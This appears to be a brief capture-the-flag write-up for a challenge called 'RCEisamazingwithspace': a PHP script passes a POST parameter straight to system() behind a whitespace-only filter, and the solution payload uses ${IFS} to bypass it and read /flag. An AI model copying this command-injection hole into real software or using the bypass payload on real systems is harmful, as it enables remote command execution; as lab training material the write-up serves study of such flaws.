### RCEisamazingwithspace

```php
<?php
highlight_file(__FILE__);
$cmd = $_POST['cmd'];
// check if space is present in the command
// use of preg_match to check if space is present in the command
if (preg_match('/\s/', $cmd)) {
    echo 'Space not allowed in command';
    exit;
}

// execute the command
system($cmd);
```

简单的空格过滤

```
cmd=cat${IFS}/flag
```

